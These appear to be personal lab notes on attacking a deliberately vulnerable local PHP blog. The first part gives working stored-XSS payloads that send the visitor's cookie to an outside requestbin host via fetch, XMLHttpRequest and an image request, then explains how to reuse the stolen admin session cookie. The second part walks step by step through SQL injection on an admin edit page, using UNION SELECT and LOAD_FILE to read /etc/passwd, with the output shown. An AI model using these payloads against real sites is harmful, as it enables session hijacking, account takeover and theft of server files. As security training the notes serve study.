

text field for comments has XSS vulnerability

Go in to welcome: http://localhost:8080/post.php?id=1 (dosent matter which blog post u go in to)


<script>alert(1)</script>
Creates alert every time url is visted

/post_comment.php?id=3&title=Admin&author=admin&text=hellofromadmin

/post_comment.php?id=3&title=erik&author=Erik&text=hellofromerik

Tried first but was to new
<script>
    {
        const formData = new FormData();
        formData.append('title', 'Admin comment');
        formData.append('author', 'Admin');
        formData.append('text', 'Comment from admin: ' + document.cookie);
        fetch('http://requestbin.whapi.cloud/1rgvotd1', {
        method: 'POST',
        body: formData
        }).then(data => console.log(data)).catch(err => console.error(err));
    }
</script>

## Comment payload
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://requestbin.whapi.cloud/1rgvotd1', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
var data = 'text=' + document.cookie;
xhr.send(data);
</script>

## To use admin cookie
function doRequestAs(phpsessid, method, path, data)
{
    document.cookie = "PHPSESSID=" + phpsessid + "; path=/";
    const xhr = new XMLHttpRequest();
    xhr.open(method, path, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
            console.log(xhr.responseText);
            } else {
            console.error('Error:', xhr.status);
            }
        }
    };
    xhr.send(data);
};
doRequestAs("", "GET", "/admin", "");

This works aswell to get out the admin cookie through phantom

<script>new Image().src='http://requestbin.whapi.cloud/1n3ih4l1?c='+document.cookie;</script>

Then we can identify the PHPSESSID, this is the cookue value we want to steal and use ourselfs

Then we can either use this to make the admin do something for us or we can set ourselfs manually to admin by changing our browser cookie in the inspect -> application tab -> cookies -> set to admin cookie (must be latest until we get acces or it might erase older ones) 

Then go directly to http://localhost:8080/admin and it will assume your admin and will log you in, going to the login for admin page will not automaticlly log you in as admin



Part 2

The process of going through the lab:

Edit looks promising or creating a new post

The sql probably looks like SELECT title, body FROM posts WHERE id = 2

When entering in a randome url post id we get to a blank form http://localhost:8080/admin/edit.php?id=5123123 Editing here does nothing but it tells us how it handles things. 

http://localhost:8080/admin/edit.php?id=3-1 gives us post nr 2 which indicates that the server is activly evaluating the input, so a numeric injection

http://localhost:8080/admin/edit.php?id=3' Break the sql
Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /var/www/classes/post.php on line 111 Notice: Undefined variable: post in /var/www/classes/post.php on line 115
Notice: Trying to get property of non-object in /var/www/admin/edit.php on line 19
Notice: Trying to get property of non-object in /var/www/admin/edit.php on line 16

We now know that the database used is mysql.

http://localhost:8080/admin/edit.php?id=2 ORDER BY 1
http://localhost:8080/admin/edit.php?id=2 ORDER BY 2
http://localhost:8080/admin/edit.php?id=2 ORDER BY 3
http://localhost:8080/admin/edit.php?id=2 ORDER BY 4
http://localhost:8080/admin/edit.php?id=2 ORDER BY 5

Tells us that table has 4 collumns because it faild on the 5th.

-1 here before all url is to break it so we can acces the database

http://localhost:8080/admin/edit.php?id=-1+UNION+SELECT+1,2,3,4 
Gives 2 3 so column 2 is the title field and column 3 is the text field (where the numbers were shown), so 1 and 4 is probably id or author or date or something like that?


http://127.0.0.1:8080/admin/edit.php?id=-1%20GROUP%20BY%20id%20HAVING%201=1
http://127.0.0.1:8080/admin/edit.php?id=-1%20GROUP%20BY%20date%20HAVING%201=1
http://127.0.0.1:8080/admin/edit.php?id=-1%20GROUP%20BY%20time%20HAVING%201=1


http://localhost:8080/admin/edit.php?id=-1 UNION SELECT 1,USER(),3,4
root@localhost

http://localhost:8080/admin/edit.php?id=-1 UNION SELECT 1,2,LOAD_FILE('/etc/passwd'),4
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh     # ####
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false        ####
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash        ####
       
